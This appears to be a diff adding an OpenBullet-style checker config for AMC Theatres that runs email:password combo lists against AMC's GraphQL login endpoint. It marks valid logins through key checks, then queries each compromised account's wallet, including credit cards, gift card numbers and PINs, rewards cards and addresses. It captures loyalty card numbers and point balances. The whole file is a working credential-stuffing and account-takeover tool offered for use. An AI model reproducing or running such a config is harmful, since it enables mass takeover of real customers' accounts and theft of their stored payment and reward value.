@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "AMC Theatres",
+  "SuggestedBots": 20,
+  "LastModified": "2018-06-20T23:17:17.1543314+00:00",
+  "AdditionalInfo": "",
+  "Author": "Choempie",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://graph.amctheatres.com/" AutoRedirect=TRUE 
+  CONTENT "{\"operationName\":\"LoginModal\",\"variables\":{\"hasOrder\":false,\"token\":\"\"},\"query\":\"query LoginModal($token:String!,$hasOrder:Boolean!){\nviewer{\n...SocialLoginButtons_Viewer\norder(token:$token)@include(if:$hasOrder){\nid\ntoken\n__typename\n}\n__typename\n}\n}\n\nfragment SocialLoginButtons_Viewer on Viewer{\naccountProviders{\nclientId\nprovider\nproviderApiToken\n__typename\n}\n__typename\n}\n\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "providerApiToken" 
+REQUEST POST "https://graph.amctheatres.com/" AutoRedirect=TRUE 
+  CONTENT "{\"operationName\":\"userLogin\",\"variables\":{\"input\":{\"email\":\"<USER>\",\"password\":\"<PASS>\"}},\"query\":\"mutation userLogin($input:LoginInput!){\nuserLogin(input:$input){\nuser{\nid\naccount{\nid\n...accountFatQuery\n__typename\n}\n__typename\n}\n__typename\n}\n}\n\nfragment accountFatQuery on Account{\naccountId\naccountType\nemailAddress\n__typename\n}\n\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "account" 
+  KEYCHAIN Failure OR 
+    KEY "<title>Request Rejected</title>" 
+    KEY "Internal Server Error" 
+    KEY "apiCode\":41" 
+    KEY "apiCode\":21" 
+REQUEST POST "https://graph.amctheatres.com/" AutoRedirect=TRUE 
+  CONTENT "{\"operationName\":\"Wallet\",\"variables\":{},\"query\":\"query Wallet {\nviewer {\nuser {\naccount {\nid\n...CreditCardSection_Account\n...DisneyRewardsSection_Account\n...GiftCardSection_Account\n...PromoBoxItems_Account\n...RenewPremiereMembership_Account\n...StubsSection_Account\n__typename\n}\n__typename\n}\n__typename\n}\n}\n\nfragment CreditCardSection_Account on Account {\n...CreditCards_Account\n...accountUtils_Account\n__typename\n}\n\nfragment CreditCards_Account on Account {\nid\nwallet {\nid\ncreditCards {\ndefault\nmerchantToken\nname\n...CreditCard_CreditCard\n__typename\n}\n__typename\n}\n...CreditCard_Account\n__typename\n}\n\nfragment CreditCard_Account on Account {\n...CreditCardControls_Account\n__typename\n}\n\nfragment CreditCardControls_Account on Account {\n...EditCreditCardModal_Account\n__typename\n}\n\nfragment EditCreditCardModal_Account on Account {\n...accountUtils_Account\n...EditCreditCardForm_Account\n__typename\n}\n\nfragment accountUtils_Account on Account {\naccountType\nisActive\nisLimitless\n__typename\n}\n\nfragment EditCreditCardForm_Account on Account {\naddress1\naddress2\ncity\nstate\npostalCode\n__typename\n}\n\nfragment CreditCard_CreditCard on CreditCard {\ncardType\nexpirationDateDisplay {\nmonthYear\n__typename\n}\nlastFour\nmerchantToken\nname\n...CreditCardControls_CreditCard\n__typename\n}\n\nfragment CreditCardControls_CreditCard on CreditCard {\naddress1\ncity\nlastFour\nmerchantToken\npostalCode\nstate\n...EditCreditCardModal_CreditCard\n__typename\n}\n\nfragment EditCreditCardModal_CreditCard on CreditCard {\n...EditCreditCardForm_CreditCard\ncardType\ndefault\nexpirationDateDisplay {\nmonthYear\n__typename\n}\nlastFour\nmerchantToken\n__typename\n}\n\nfragment EditCreditCardForm_CreditCard on CreditCard {\naddress1\naddress2\ncity\ndefault\nexpirationDate\nexpirationDateDisplay {\nmonthYear\n__typename\n}\nlastFour\nmerchantToken\nname\npostalCode\nstate\n__typename\n}\n\nfragment DisneyRewardsSection_Account on Account {\nwallet {\nid\ndisneyRewardsCardSummary {\ncount\n__typename\n}\n...DisneyRewardsCards_Wallet\n__typename\n}\n__typename\n}\n\nfragment DisneyRewardsCards_Wallet on Wallet {\ndisneyRewardsCards {\nid\nbalance\nlastFour\nmerchantToken\nnumber\npin\n__typename\n}\n__typename\n}\n\nfragment GiftCardSection_Account on Account {\nwallet {\nid\n...GiftCards_Wallet\n__typename\n}\n__typename\n}\n\nfragment GiftCards_Wallet on Wallet {\ngiftCards {\nid\nlastFour\nmerchantToken\n...GiftCardControls_GiftCard\n__typename\n}\n__typename\n}\n\nfragment GiftCardControls_GiftCard on GiftCard {\nnumber\n...ViewGiftCardModal_GiftCard\n__typename\n}\n\nfragment ViewGiftCardModal_GiftCard on GiftCard {\nbalance\nnumber\npin\nqrCode\n__typename\n}\n\nfragment PromoBoxItems_Account on Account {\nid\naccountId\naccountType\n__typename\n}\n\nfragment RenewPremiereMembership_Account on Account {\naccountId\nlimitlessSubscription {\nisActive\n__typename\n}\nloyaltyCard {\ncardNumber\nenrollDate\nexpirationDate\nexpirationDateDisplay {\ndate\ndateShort\n__typename\n}\nstatus\nstatusInfo\n__typename\n}\n...accountUtils_Account\n__typename\n}\n\nfragment StubsSection_Account on Account {\naccountType\n...StubsCard_Account\n__typename\n}\n\nfragment StubsCard_Account on Account {\naccountId\naccountType\ndisplayName\nlimitlessSubscription {\nbenefitExpirationDate {\ndate\n__typename\n}\ncurrentReservations\nmaxReservations\n__typename\n}\nloyaltyCard {\ncardNumber\nexpirationDate\n__typename\n}\nrewards {\nid\npendingPoints\npointsToNextReward\npointBalance\nrewardsBalance\n__typename\n}\n...accountUtils_Account\n...SendMeCardByMail_Account\n__typename\n}\n\nfragment SendMeCardByMail_Account on Account {\naccountType\ncanRequestCard\ncardRequestedDate\nisLimitless\n...VerifyAddressModal_Account\n__typename\n}\n\nfragment VerifyAddressModal_Account on Account {\nfirstName\nlastName\naddress1\naddress2\ncity\nstate\npostalCode\n__typename\n}\n\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "account" 
+  KEYCHAIN Failure OR 
+    KEY "account\":null" 
+PARSE "<SOURCE>" LR "pointBalance\":" "," Recursive=FALSE -> CAP "Points" "" "" 
+PARSE "<SOURCE>" LR "pointsToNextReward\":" "," Recursive=FALSE -> CAP "To Next reward" "" "" 
+PARSE "<SOURCE>" LR "rewardsBalance\":" "," Recursive=FALSE -> CAP "Rewards balance" "" "" 
+PARSE "<SOURCE>" LR "accountType\":\"" "\"" Recursive=FALSE -> CAP "Account Type" "" "" 
+PARSE "<SOURCE>" LR "cardNumber\":\"" "\"" Recursive=FALSE -> CAP "Card Number" "" "" 
+PARSE "<SOURCE>" LR "enrollDate\":\"" "\"" Recursive=FALSE -> CAP "Enrolled since" "" "" 
